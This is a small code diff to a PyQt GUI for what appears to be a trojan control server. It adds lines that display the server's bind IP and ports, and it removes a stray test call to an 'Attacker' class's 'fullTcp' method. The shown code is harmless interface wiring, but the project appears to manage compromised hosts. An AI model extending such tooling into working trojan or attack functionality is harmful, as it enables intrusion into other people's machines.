@@ -28,6 +28,10 @@ class ServerMain(QWidget, Ui_Server):
         self.trojanServer.signals = self.signals
         self.signals.chickenUpSignal.connect(self.addToCurrentList)
         self.freshCurrentList()
+        self.ipInput.setText(self.trojanServer.bind_IP)
+        self.usp.setText(str(self.trojanServer.utpPort))
+        self.urp.setText(str(self.trojanServer.utpRecvPort))
+        self.tp.setText(str(self.trojanServer.tcpPort))
         self.bind()
         print("Welcome!")
 
@@ -140,8 +144,4 @@ if __name__ == '__main__':
     MainWin.show()
     sys.exit(app.exec_())
 
-#
-a = Attacker()
-a.fullTcp(ip='fd', port='')
-a.stop()
 
